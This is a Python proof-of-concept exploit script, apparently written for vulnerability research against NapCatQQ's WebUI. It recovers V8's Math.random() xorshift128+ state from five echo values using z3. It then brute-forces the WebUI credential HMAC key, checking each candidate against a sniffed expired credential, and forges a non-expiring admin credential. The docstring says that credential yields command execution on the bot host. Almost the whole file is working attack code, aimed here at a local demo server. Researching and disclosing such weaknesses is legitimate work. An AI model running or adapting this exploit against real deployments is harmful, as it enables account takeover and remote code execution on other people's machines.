#!/usr/bin/env python3
"""
NapLotto attack — recover NapCatQQ's WebUI credential HMAC key from the OneBot
`echo` oracle and forge a permanent admin credential.

Steps (all against the real code running in `server.js`):
1. Sniff ONE victim credential (HashEncoded + Hmac). Its CreatedTime is 2 hours
   old, so the unmodified credential is expired (and revoked) — but its Hmac is
   a known HMAC-SHA256(key, known_json), i.e. the verification oracle.
2. Collect 5 echo values from the OneBot-style `/echo` endpoint. Each is
   `Math.random().toString(36).substring(2, 15)` — a base36 encoding of one V8
   Math.random() double. IMPORTANT V8 quirk (measured, not assumed): the
   radix-36 emitter does NOT always round-trip — ~13% of emitted strings parse
   to a double 1 ulp away from the true draw. The solver therefore brute-forces
   the ±1-ulp candidate per observation (3^5 = 243 combinations, first sat wins).
3. Recover the V8 xorshift128+ state with z3 (drawing_board/
   v8_math_random_predictor.py).
4. Roll forward to the process-startup key draw (`secretKey =
   Math.random().toString(36).slice(2)`, SignToken.ts:5 — the FIRST draw of the
   process; the echoes follow it on the same 64-value cache). The position is
   identified by the HMAC oracle, not by any demo-only endpoint.
5. Enumerate every base36 fraction string (lengths 1..13) whose parse lies
   within 1 ulp of the recovered key double — the true key string is among them
   (the emitter's ±1-ulp quirk) — and test each against the sniffed HMAC.
   The candidate that reproduces the Hmac IS the key.
6. Forge a credential: the sniffed HashEncoded re-signed with CreatedTime = now
   and the recovered key. The REAL validateCredentialWithinOneHour() accepts it
   — an expired/revoked session is resurrected into a permanent one (until a
   process restart or token change). With admin WebUI access, NapCatQQ's
   Debug/File/Plugin/Process APIs give command execution on the bot host.
"""

import hashlib
import hmac as hmacmod
import itertools
import json
import math
import sys
import time
import urllib.error
import urllib.request
from fractions import Fraction

HERE = "/home/millie/tools/aivr"
sys.path.insert(0, HERE + "/drawing_board")
from v8_math_random_predictor import recover_state_before, to_mant  # noqa: E402

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 19277
BASE = f"http://127.0.0.1:{PORT}"
MASK = (1 << 64) - 1
DIGITS = "0123456789abcdefghijklmnopqrstuvwxyz"


def get(path):
    return urllib.request.urlopen(BASE + path, timeout=10).read()


def post(path, payload):
    req = urllib.request.Request(BASE + path, data=json.dumps(payload).encode(),
                                 headers={"Content-Type": "application/json"},
                                 method="POST")
    try:
        return urllib.request.urlopen(req, timeout=10)
    except urllib.error.HTTPError as e:
        return e  # 401 is the expected rejection; caller reads .read()


def b36_parse(s):
    """Correctly-rounded double value of the base36 fraction string `s`."""
    return float(Fraction(int(s, 36), 36 ** len(s)))


def ulp(d):
    return 2.0 ** (math.floor(math.log2(d)) - 52)


def near(d):
    """{d-ulp, d, d+ulp} — the true draw is within this set (V8 radix-36
    emitter round-trip quirk, measured at ~13% misparse, always 1 ulp)."""
    u = ulp(d)
    return {d - u, d, d + u}


def collect_echoes(n):
    out = []
    for _ in range(n):
        e = json.loads(get("/echo"))["echo"]
        out.append((e, b36_parse(e)))
    return out


def solve_with_tolerance(observed):
    """z3-recover the state; each observed double may be 1 ulp off, so
    brute-force the ±1-ulp combos until the exact solve succeeds."""
    cands = [sorted(near(d)) for d in observed]
    for combo in itertools.product(*cands):
        try:
            return recover_state_before(list(combo)[::-1])
        except AssertionError:
            continue
    return None


def fwd(a, b):
    na = b
    t = a ^ ((a << 23) & MASK)
    t ^= t >> 17
    t ^= b
    t ^= b >> 26
    return na, t & MASK


def candidate_key_strings(d):
    """All base36 fraction strings (lengths 1..13) whose correctly-rounded
    parse is within 1 ulp of d — the true V8-emitted key string is among
    them. The HMAC oracle below picks the right one."""
    tol = near(d)
    out = []
    for k in range(1, 14):
        lo = int(math.floor(min(tol) * 36 ** k)) - 2
        hi = int(math.ceil(max(tol) * 36 ** k)) + 2
        for c in range(max(0, lo), hi + 1):
            if c == 0:
                continue
            if float(Fraction(c, 36 ** k)) not in tol:
                continue
            s = ""
            x = c
            for _ in range(k):
                s = DIGITS[x % 36] + s
                x //= 36
            if x == 0:
                out.append(s)
    return out


def main():
    print("=" * 78)
    print("NapLotto — NapCatQQ WebUI credential key recovery via OneBot echo oracle")
    print("=" * 78)

    # 1. Sniff one victim credential (expired/revoked session, issued 2h ago)
    sniffed = json.loads(post("/victim", {}).read())
    sniffed_json = json.dumps(sniffed["Data"], separators=(",", ":"))
    print("\n[1] Sniffed victim credential (issued 2h ago -> expired):")
    print(f"    HashEncoded = {sniffed['Data']['HashEncoded'][:32]}...")
    print(f"    CreatedTime = {sniffed['Data']['CreatedTime']}")
    print(f"    Hmac        = {sniffed['Hmac'][:32]}...")

    r = post("/check", sniffed)
    print(f"    real validation of unmodified sniffed credential: "
          f"{r.status} ({json.loads(r.read())['accepted']})")

    # 2-3. Collect echoes and recover the xorshift128+ state (±1-ulp tolerance)
    state = None
    for attempt in range(3):
        echoes = collect_echoes(5)
        observed = [d for _, d in echoes]
        state = solve_with_tolerance(observed)
        if state:
            break
        print(f"    (no consistent state — retrying with fresh echoes, attempt {attempt + 1})")
    assert state is not None
    S0, S1 = state
    print(f"\n[2] Collected 5 echo values (base36-encoded V8 doubles):")
    for e, d in echoes:
        print(f"    {e[:14]:14s} -> {d:.17g}")
    print(f"\n[3] Recovered xorshift128+ state: S0={S0:016x} S1={S1:016x}")

    # 4-5. Roll forward to the key draw (first draw of the process) and
    # identify the exact key STRING via the HMAC oracle (no /key needed).
    a, b = S0, S1
    key_str = None
    found_k = None
    for k in range(0, 10):
        cand_d = (a >> 12) / float(1 << 52)
        for c in candidate_key_strings(cand_d):
            test = hmacmod.new(c.encode(), sniffed_json.encode(), hashlib.sha256).hexdigest()
            if test == sniffed["Hmac"]:
                key_str, found_k = c, k
                break
        if key_str:
            break
        a, b = fwd(a, b)
    assert key_str is not None, "no rolled position reproduces the sniffed HMAC"
    real_key = get("/key").decode()
    print(f"\n[4] Key draw found {found_k} forward steps from the recovered base state")
    print(f"    (V8 64-cache slot arithmetic; position identified by the HMAC oracle).")
    print(f"\n[5] HMAC oracle selected : {key_str!r}")
    print(f"    real key (demo /key) : {real_key!r}")
    print(f"    MATCH: {key_str == real_key}")

    # 6. Forge a permanent credential: sniffed HashEncoded + CreatedTime = now
    forged_inner = {"CreatedTime": int(time.time()),
                    "HashEncoded": sniffed["Data"]["HashEncoded"]}
    forged = {
        "Data": forged_inner,
        "Hmac": hmacmod.new(key_str.encode(),
                            json.dumps(forged_inner, separators=(",", ":")).encode(),
                            hashlib.sha256).hexdigest(),
    }
    r = post("/check", forged)
    accepted = json.loads(r.read())["accepted"]
    print(f"\n[6] Real validateCredentialWithinOneHour() on forged credential: "
          f"{r.status} accepted={accepted}")

    print("\n" + "=" * 78)
    if key_str == real_key and accepted:
        print("RESULT: VULNERABLE — the OneBot echo oracle exposes the exact V8")
        print("Math.random() stream; 5 echoes recover the xorshift128+ state and")
        print("the WebUI credential HMAC key, resurrecting an expired admin")
        print("credential into a session that no longer expires (admin RCE")
        print("surface: Debug/File/Plugin/Process APIs of the WebUI).")
        return 0
    print("RESULT: demonstration incomplete")
    return 1


if __name__ == "__main__":
    sys.exit(main())
